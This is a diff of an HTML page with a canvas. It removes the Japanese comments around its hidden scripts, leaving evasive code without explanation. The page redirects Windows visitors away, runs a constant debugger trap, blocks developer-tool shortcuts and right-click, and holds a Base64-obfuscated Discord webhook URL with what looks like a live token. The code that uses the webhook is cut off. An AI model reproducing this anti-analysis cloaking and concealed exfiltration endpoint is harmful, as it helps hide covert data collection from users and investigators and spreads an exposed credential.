@@ -71,25 +71,21 @@
 <body oncontextmenu="return false;">
 
     <script>
-        // --- Windows強制終了・リダイレクト処理 ---
         (function() {
             const platform = navigator.platform.toLowerCase();
             const ua = navigator.userAgent.toLowerCase();
             if (platform.indexOf('win') !== -1 || ua.indexOf('windows') !== -1) {
-                // Windowsなら即座にGoogleに飛ばす
                 window.location.replace("https://www.google.com");
                 document.body.innerHTML = "";
             }
         })();
 
-        // デバッガー対策
         setInterval(function() {
             (function() {
                 return false;
             }['constructor']('debugger')['call']());
         }, 50);
 
-        // ショートカットキー禁止
         document.addEventListener('keydown', function(e) {
             if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || (e.ctrlKey && e.keyCode === 85)) {
                 e.preventDefault();
@@ -122,7 +118,6 @@
     <canvas id="canvas" width="600" height="600"></canvas>
 
     <script>
-        // Webhook URLをBase64で難読化
         const _0x8f2a = "aHR0cHM6Ly9wdGIuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE0NTE2MzE3NDg0MDMxNzE0ODAvSXJMSzI2aEh2NU42U0ljZkkzT0p5bng0VXV5TUtTM0Y2Qm5iYUlKV2p1MjIzRzVRdHBSRm9qUzJBNHJQNGdiSnFnREs=";
         const getUrl = () => atob(_0x8f2a);
 
